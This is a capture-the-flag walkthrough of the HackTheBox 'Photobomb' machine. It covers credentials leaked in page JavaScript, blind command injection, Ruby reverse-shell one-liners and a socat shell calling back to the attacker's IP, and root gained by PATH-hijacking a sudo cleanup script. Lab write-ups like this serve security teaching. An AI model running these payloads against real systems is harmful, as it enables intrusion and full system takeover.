# Hackthebox - Photobomb - Linux

![Photobomb](../.res/htb-photobomb.png)  

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sC -sV -O -Pn -p- 10.10.11.182                   
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-24 09:06 EST
Nmap scan report for 10.10.11.182
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/24%OT=22%CT=1%CU=33794%PV=Y%DS=2%DC=I%G=Y%TM=63A707
OS:99%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.92 seconds
```

- We need to add a line to our `/etc/hosts/` file like this `10.10.11.182	photobomb.htb`

## Port 80

- When browsing to http://photobomb.htb/ we end up here  
![Landing page](../.res/2022-12-24-09-12-28.png)  
- Clicking on the link will open a prompt to login
- Looking at the code we find this

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

- Great we have credentials `pH0t0:b0Mb!` using these we are able to login

![after login](../.res/2022-12-24-09-25-17.png)  

### Gobuster

- Nothing here. Most endpoints give this 404 page.

![Sinatra](../.res/2022-12-24-09-28-47.png)  

- Here is the code of the page

```html
</h2>
  <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
  <div id="c">
    Try this:
    <pre>get &#x27;&#x2F;printers&#x27; do
  &quot;Hello World&quot;
end
</pre>
  </div>
</body>
</html>
```

- We can note here the presence of [Sinatra](https://sinatrarb.com/), and keep it aside for later.
- Let's play a little with the download feature
- Photobomb kinda reminds me about zipbomb (the attack) but we do not have an upload form at the moment.
- It seems like we should focus on injection or path traversal vulnerabilities.
- Let's use burp intruder for some fuzzing. Looking at the results, we get some interesting backtrace.  
- See the results here
![intruder](../.res/2022-12-24-10-51-49.png)
- See the backtrace we get
![backtrace](../.res/2022-12-24-10-53-32.png)  
- Trying out a wget in the filtype parameter in a server on my kali does something. Doing a whoami however won't work because we do not get the output as it is blind command injection.
- We start a local webserver `python3 -m http.server 80`
- We launch a wget through burp repeater. It has to be url encoded, we can do it easily with burp inspector or ctr+U
![wget in burp](../.res/2022-12-24-12-18-44.png)  
- We can see that it works
![request from target](../.res/2022-12-24-12-20-30.png)  
- Using this we could launch a reverse shell
- Our [usual bash commands](https://csbygb.gitbook.io/pentips/linux/useful#launch-shells-from-a-terminal) are not successful.
- This one in ruby looses the connection right away `ruby -rsocket -e'f=TCPSocket.open("10.10.14.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby) has another option for us `ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.2","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`  
This one does not die on us and we get a shell!  
![shell](../.res/2022-12-24-14-11-39.png)  
- We are the user wizard. Let's grab the user flag

## Privilege escalation

- Let's get a better shell with a socat binary
- `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat` from your kali
- Then we put on our python web server `python3 -m http.server 80`
- We also set up a listener with socat

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4445
```

Then we go to a writable directory `wget http://10.10.14.2/socat`

- `chmod +x socat` 
- ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.2:4445`
- We get a more decent shell this way
![socat](../.res/2022-12-24-14-48-08.png)

### Linepeas

- We take linpeas and launch it
- Interesting input to investigate further

```bash
*/5 * * * * sudo /opt/cleanup.sh
```

- There is an interesting cronjob.
- Here is the content of `/opt/cleanup.sh`

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

- Also we can set the env for /opt/cleanup.sh and run it without the root password. See `sudo -l` result here

```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

- The cleanup script uses the find command. We could make our own find command and change the path.

> INSIDER TIP: Don't do like me do not forget to chmod +x your malicious find script... -_-'

- So here is the process
  - Create your own malicious find command. Here is mine (it will lauch root shell but you could also make a reverse shell for example)
  
  ```bash
  #!/bin/bash
  bash
  ```

  - Get it in your target (you can also write your script from the target with echo) `wget http://10.10.14.2/find`
  - Make your script executable `chmod +x find`
  - Set the path `sudo PATH=/home/wizard/photobomb:$PATH /opt/cleanup.sh` this way the find command will be fetch where you want here in the photobomb folder
  - You should be root in a very few seconds

We can grab the root flag
